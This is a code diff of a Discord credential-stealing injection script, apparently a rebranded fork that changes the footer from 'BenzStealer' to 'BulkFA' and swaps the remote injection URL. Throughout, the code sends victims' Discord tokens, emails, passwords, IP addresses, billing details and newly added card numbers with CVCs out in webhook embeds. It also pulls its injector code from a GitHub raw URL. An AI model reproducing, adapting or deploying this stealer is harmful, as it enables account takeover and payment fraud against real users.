@@ -13,8 +13,8 @@ const config = {
   ping_val: '@everyone', 
   embed_name: ' ', 
   embed_icon: ' ',
-  embed_color: 3092790, 
-  injection_url: 'https://raw.githubusercontent.com/oxyidz/zggzzz/main/index.js',
+  embed_color: 000000, 
+  injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
@@ -487,14 +487,6 @@ const getBilling = async (token) => {
   return billing;
 };
 
-const fetchFriends = async (token) => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
-    xmlHttp.open("GET", "${config.api}/relationships", false); 
-    xmlHttp.setRequestHeader("Authorization", "${token}"); 
-    xmlHttp.send(null); 
-    xmlHttp.responseText`);
-  return JSON.parse(bill);
-};
 
 const getNitro = (flags) => {
   switch (flags) {
@@ -592,51 +584,45 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-             "name": "<a:sn1:989238042164351006> Token:",
-             "value": `\`\`\`${token}\`\`\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
-             "inline": false
+            name: '<a:944007295417843743:959785231982931979> Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            inline: false,
           },
           {
-            name: '<:sn4:989240048157356062> Badges:',
+            name: '<a:satanist:802503618972483615> Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:sn6:989338031179857921> Nitro Type:',
-            value: `*Soon...*`,
+            name: '<:944007233820307467:959785232037470208> Billing:',
+            value: `**${billing}**`,
             inline: true,
           },
           {
-            "name": "<a:sn5:989240264386293800> Billing:",
-            "value": `\`${billing}\``,
-            "inline": true
-          },
-          {
-            name: '<:sn3:989239794108350514> IP:',
-            value: `\`${config.ip}\`\n[IpInfo](https://ipinfo.io/${ip})`,
+            name: '<:944007233820307467:959785232037470208> Email:',
+            value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<a:sn2:989239408400138310> Email:',
-            value: `\`${email}\`\n[Copy Email](https://superfurrycdn.nl/copy/${token})`,
+            name: '<:944007233820307467:959785232037470208> IP:',
+            value: `\`${config.ip}\``,
             inline: true,
           },
           {
-            name: '<a:sn7:989344653323169802> Password:',
-            value: `\`${password}\`\n[Copy Password](https://superfurrycdn.nl/copy/${token})`,
+            name: '<a:satan:846706207632261120> Password:',
+            value: `\`${password}\``,
             inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' ' + '('+json.id+')',
-          icon_url: `https://cdn.discordapp.com/attachments/990782044676182069/990798452701147206/8c97eb5bb60b5e7bae869b44ddad6333.gif`,
+          name: json.username + '#' + json.discriminator + ' - ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BenzStealer',
-          icon_url: `https://cdn.discordapp.com/attachments/990782044676182069/990798452701147206/8c97eb5bb60b5e7bae869b44ddad6333.gif`,
+          text: 'BulkFA',
         },
         thumbnail: {
-          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
         },
       },
     ],
@@ -674,11 +660,11 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' ('+json.id+') ',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BenzStealer',
+          text: 'BulkFA',
         },
       },
     ],
@@ -716,11 +702,11 @@ const emailChanged = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' ('+json.id+') ',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BenzStealer',
+          text: 'BulkFA',
         },
       },
     ],
@@ -758,11 +744,11 @@ const PaypalAdded = async (token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' ('+json.id+') ',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BenzStealer',
+          text: 'BulkFA',
         },
       },
     ],
@@ -804,7 +790,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BenzStealer',
+          text: 'BulkFA',
         },
       },
     ],
@@ -848,7 +834,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BenzStealer',
+          text: 'BulkFA',
         },
       },
     ],
